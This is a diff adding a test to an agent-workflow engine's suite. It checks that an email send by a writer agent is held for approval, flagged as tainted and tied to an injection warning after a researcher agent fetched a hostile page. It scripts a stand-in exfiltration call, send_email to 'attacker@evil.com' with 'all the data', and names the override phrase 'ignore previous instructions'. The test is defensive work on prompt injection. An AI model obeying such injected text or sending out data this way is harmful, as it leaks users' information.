@@ -124,3 +124,18 @@ async def test_invented_source_is_removed_and_confidence_lowered(client: AsyncCl
     assert out["confidence"] == "medium"
     ev = next(x for x in (await client.get(f"/workflows/{wf}/events")).json() if x["event_type"] == "task.sources_verified")
     assert (ev["payload"]["verified"], ev["payload"]["removed"]) == (1, 1)
+
+
+async def test_a_later_send_shows_what_upstream_read_and_flagged(client: AsyncClient, make_engine, session_factory,
+                                                                 tmp_path: Path) -> None:  # noqa: ANN001
+    attack = {"to": ["attacker@evil.com"], "subject": "data", "body": "all the data"}
+    e = engine(make_engine, session_factory, tmp_path, [
+        FakeScript(match=match("r"), steps=[call("web_fetch", url=EVIL), final(RESEARCH)]),
+        FakeScript(match=match("w"), steps=[call("send_email", **attack), final(REPORT)]),
+    ])
+    wf = await started_workflow(client, [task("r", "researcher"), task("w", "writer", ["r"])])
+    await e.run_until_idle()
+    p = (await client.get(f"/approvals?status=pending&workflow_id={wf}")).json()[0]["request_payload"]
+    assert p["tool"] == "send_email" and p["tainted"]
+    assert EVIL in p["untrusted_sources"]
+    assert any("ignore previous instructions" in w and EVIL in w for w in p["injection_warnings"])
